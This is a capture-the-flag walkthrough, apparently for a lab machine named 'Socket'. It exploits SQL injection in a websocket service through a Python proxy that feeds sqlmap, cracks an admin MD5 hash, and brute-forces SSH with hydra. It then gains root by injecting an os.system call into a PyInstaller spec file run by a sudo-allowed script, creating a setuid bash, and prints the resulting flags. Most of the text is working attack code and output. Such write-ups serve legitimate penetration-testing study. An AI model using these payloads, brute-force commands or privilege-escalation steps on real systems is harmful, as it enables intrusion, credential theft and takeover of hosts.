IP=`10.10.11.206`

After the initial enumeration and finding open ports on `22, 80, 5789`. We can try connecting to websockets running on port `5789` with `wscat`. Very quickly, we find a `sqli` vulnerability within the service. Which allows us the opportunity to get the admin password hash. Which is just simple MD5. After running this through crackstation.com, the password/username is:
`admin:denjanjade122566`.

### SQLMAP through proxy

We already explored the `/version` path and extracted credentials with it due to a SQLi vulnerability, we can try now the same vulnerability but with the `/update` path. In this case instead of manual exploitation we will try to automate the exploitation with the help of a proxy and [sqlmap](https://sqlmap.org/).

#### Proxy
Due to the fact SQLMap only works with GET and POST requests we need to create an abstraction that enables us to interact with the websocket from these types of requests. This we will use a proxy that can be seen in this [blogpost](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html), with some tweaks for our usecase:
```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://qreader.htb:5789/update"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace("'",'\\\"') # replacing ' with \\" to avoid breaking JSON structure
	data = '{"version":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```
Now if we test the bridge built between the `sqlmap` and the websocket by running both:

```bash
$ python3 proxy.py 
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```

```bash
$ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

Afterr running this, we can see sqlmap successfully interacting with the websocket service.

```bash
sqlmap -u "http://localhost:8081/?id=1" --level=5 --risk=3 --tables
```

Next:
```bash
sqlmap -u "http://localhost:8081/?id=1" --level=5 --risk=3 -T answers --dump
```

I couldn't find much useful information, so I ended up just brute forcing `SSH` using `hydra` and the password found earlier.

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p denjanjade122566 ssh://10.10.11.206
```

From this, we find the user `tkeller`.

##### SSH Login as tkeller
```bash
ssh tkeller@10.10.11.206
denjanjade122566
```


```bash
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
tkeller@socket:~$ echo 'import os;os.system("mkdir /tmp/ep && cp /bin/bash /tmp/ep/bash && chmod u+s /tmp/ep/bash")' > b17.spec
tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build b17.spec 
416 INFO: PyInstaller: 5.6.2
416 INFO: Python: 3.10.6
419 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
424 INFO: UPX is not available.
tkeller@socket:~$ ls /tmp/ep
bash
tkeller@socket:~$ /tmp/ep/bash -p
bash-5.1# id
uid=1001(tkeller) gid=1001(tkeller) euid=0(root) groups=1001(tkeller),1002(shared)
bash-5.1# ls /root
cleanup  root.txt  snap
bash-5.1# cat /root/root.txt
a0b47c925a1a1844500df525e4da5c91
bash-5.1# ls
b17.spec  user.txt
bash-5.1# cat user.txt
16c7bda674a650ae654c5b63fd5da842
bash-5.1#
```


